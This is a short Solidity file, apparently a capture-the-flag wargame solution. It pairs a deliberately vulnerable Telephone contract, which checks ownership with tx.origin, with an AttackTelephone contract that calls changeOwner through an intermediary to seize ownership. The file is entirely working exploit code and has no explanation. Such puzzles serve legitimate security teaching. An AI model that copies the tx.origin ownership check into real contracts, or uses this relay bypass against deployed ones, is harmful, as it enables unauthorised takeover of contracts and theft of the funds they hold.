// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Telephone {

  address public owner;

  constructor() public {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}

contract AttackTelephone {
    Telephone phone;

    constructor(address _phone) public {
        phone = Telephone(_phone);
    }

    function attackTelephone(address _owner) public {
        phone.changeOwner(_owner);
    }
}
